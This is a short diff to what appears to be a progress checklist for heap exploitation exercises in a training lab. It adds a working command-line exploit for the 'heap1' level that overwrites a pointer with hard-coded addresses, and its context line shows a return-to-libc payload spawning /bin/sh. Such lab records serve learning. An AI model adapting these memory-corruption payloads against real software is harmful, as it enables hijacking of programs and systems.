@@ -33,6 +33,9 @@ print padding + return_op + call_system + after_system_execution + bin_sh_path
 ## Heap
 - [x] heap0
 - [x] heap1
+```
+./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
+```
 - [ ] heap2
 - [ ] heap3
 
